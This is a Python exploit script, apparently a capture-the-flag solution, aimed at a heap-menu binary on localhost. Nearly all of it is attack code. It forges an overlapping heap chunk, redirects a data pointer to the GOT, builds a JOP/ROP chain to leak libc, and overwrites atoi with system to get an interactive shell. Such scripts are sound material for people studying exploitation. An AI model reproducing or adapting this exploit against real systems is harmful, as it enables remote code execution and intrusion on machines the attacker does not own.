from pwnlib import *
import socket


def c():
	return s.ru("Your choice:")


s = Socket(("localhost", 6767))
print c()


#--- allocate BUF

s.send("4\n")
s.ru(")")
s.send("n\n")
c()


#--- allocate A (size 0x18)
#--- allocate B (size 0x90 for concreteness)
#--- chop off B ptr's LSB

s.send("1\n")
s.ru("Size :")
s.send("%d\n" % (0x90))
s.ru("Content:")
s.send("AAAAAAAA")
s.ru("Name:")
s.send("BBBBBBBB")
c()


#--- fill up BUF so we put a fake chunk there
#	--- make it smallbin-sized so we consolidate
#	--- do not consolidate backward (would cause unlink)
#	--- consolidate forward into top

payload = "n" + "0"*(0xfdf)
payload += pq(0)
payload += pq(0xe1)
payload += pq(0xdeadbeef)
payload += pq(0xcafebabe)

s.send("4\n")
s.ru(")")

t = s.get_sock().makefile("rw", bufsize=0x2000)
t.write(payload)
t.flush()

c()


#--- free B_chopped_off; this is a fake chunk inside BUF
#--- free A; this is okay, because PREV_INUSE is set and the next chunk is old_B
#	--- A goes on a fastbin

s.send("2\n")
c()


#--- allocate A' -> get the same position again
#--- allocate B' -> can control the full heap
#	--- corrupt A''s ptr and size

payload = "A"*0x20
payload += pq(0x100) # size
payload += pq(0x1234) # overwritten ("name")
payload += pq(0x602020) # data ptr: beginning of .got

s.send("1\n")
s.ru("Size :")
s.send("%d\n" % (0x200))
s.ru("Content:")
s.send(payload)
s.ru("Name:")
s.send("name")
c()


#--- use "edit" to get a write-what-where


# JOP to get ROP

payload  = ""
payload += pq(0x40093b) # exit
payload += pq(0x400756) # read_chk
payload += pq(0x400d3f) # puts
payload += pq(1)*3
payload += pq(0x4007a6) # read
payload += pq(5)*2
payload += pq(0x400d2d) # malloc
payload += pq(2)*1
payload += pq(0x400975) # atoi

s.send("3\n")
s.ru("Content:")
s.send(payload)




# ROP to leak puts, then read into the GOT, then call atoi(input)

raw_input("send stage 2? ")

pop_rdi = 0x0000000000400de3
payload  = pq(0x602028 + 0x20) # new rbp
payload += pq(pop_rdi)
payload += pq(0x602018)
payload += pq(0x400766) # puts
payload += pq(0x0000000000400880) # pop rbp
payload += pq(0x602070 + 0x20) 
payload += pq(0x40092d)
s.send(payload)

free = uq(s.recv()[:-1].ljust(8, chr(0)))



# put "sh" and &system into the GOT, the latter overwriting atoi

raw_input("stage 3? ")

payload = "sh" + "\x00"*6 + pq(free -0x3e6f0)
s.send(payload)



s.interact()
exit()

